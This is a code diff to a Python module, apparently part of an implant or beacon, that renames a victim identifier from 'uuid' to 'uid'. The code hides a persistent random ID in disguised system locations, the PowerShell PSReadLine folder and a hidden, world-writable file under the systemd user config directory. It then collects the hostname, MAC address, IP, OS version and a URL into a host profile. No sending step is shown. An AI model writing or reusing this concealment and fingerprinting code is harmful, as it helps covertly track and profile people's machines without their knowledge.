@@ -9,21 +9,21 @@ import uuid
 import os
 
 def run(url):
-    def get_uuid():
+    def get_uid():
         if platform.system() == "Windows":
             user = getpass.getuser()
-            if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt"):
-                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt", "r") as f:
+            if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt"):
+                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt", "r") as f:
                     return f.read().strip()
             else:
-                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
-                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uuid.txt", "w") as f:
-                    f.write(uuid_value)
-                return uuid_value
+                uid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
+                with open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\uid.txt", "w") as f:
+                    f.write(uid_value)
+                return uid_value
                 
         if platform.system() == "Linux":
             user = getpass.getuser()
-            path = f"/home/{user}/.config/systemd/user/.system_uuid"
+            path = f"/home/{user}/.config/systemd/user/.system_uid"
             if os.path.exists(path):
                 with open(path, "r") as f:
                     return f.read().strip()
@@ -31,21 +31,21 @@ def run(url):
                 subprocess.run(f'mkdir -p /home/{user}/.config/systemd/user', shell=True)
                 subprocess.run(f'touch {path}', shell=True)
                 os.chmod(path, 0o666)
-                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
+                uid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
                 with open(path, "w") as f:
-                    f.write(uuid_value)
-                return uuid_value
+                    f.write(uid_value)
+                return uid_value
                 
         if platform.system() == "Darwin":
             user = getpass.getuser()
-            if os.path.exists(f"./uuid.txt"):
-                with open(f"./uuid.txt", "r") as f:
+            if os.path.exists(f"./uid.txt"):
+                with open(f"./uid.txt", "r") as f:
                     return f.read().strip()
             else:
-                uuid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
-                with open(f"./uuid.txt", "w") as f:
-                    f.write(uuid_value)
-                return uuid_value
+                uid_value = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
+                with open(f"./uid.txt", "w") as f:
+                    f.write(uid_value)
+                return uid_value
     
     def get_ip():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -117,7 +117,7 @@ def run(url):
         'os_version': os_version,
         'hostname': hostname,
         'mac_address': mac,
-        'uuid': get_uuid(),
+        'uid': get_uid(),
         'url': url,
     
     }
